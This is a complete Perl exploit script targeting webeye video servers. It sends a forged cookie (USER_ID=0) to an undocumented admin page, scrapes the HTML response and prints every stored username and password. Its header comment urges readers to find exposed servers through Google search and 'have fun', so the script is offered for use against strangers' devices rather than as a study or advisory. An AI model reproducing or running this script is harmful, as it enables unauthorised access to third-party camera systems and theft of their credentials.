#!/usr/bin/env perl
###################
# WHAT IS THIS?
#  This is an exploit to retrieve all username and passwords from a
#  webeye video server.
# REQUIREMENTS
#  It requires some perl libraries. If you dont have them already
#  installed, search cpan.org.
# HOW DOES IT WORKS?
#  Well, its very simple, because the server provides a mechanism (not 
#  documented) to retrieve all passwords! You can read the code below,
#  its short and simple.
# If you think its fun, but dont know any webeye video server, just make a 
#  search in Google. You will find a lot of them! Have fun!
###########################################################################

use LWP::UserAgent;
use HTTP::Cookies;

$host=shift;

if ($host eq "") {
  print "Usage: webeye-xp.pl <host name>\n";
  exit;
}

my $browser = LWP::UserAgent->new();

my $resp = $browser->get("http://$host/admin/wg_user-info.ml","Cookie","USER_ID=0; path=/;");

$t = $resp->content;

#print $t;

$i = index($t,"<tr");
substr($t,0,$i+1,"");

while ($i!=-1) {
  $i = index($t,"<tr");
  substr($t,0,$i+1,"");
  $i = index($t,"value=");
  substr($t,0,$i+7,"");
  $j = index($t,"\"");
  $user = substr($t,0,$j);
  if ($user =~ /Apply/) { print "\nHave fun!\n"; exit; }
  print "user: ".$user;
  $i = index($t,"value=");
  substr($t,0,$i+7,"");
  $j = index($t,"\"");
  print "\tpass: ".substr($t,0,$j)."\n";
}
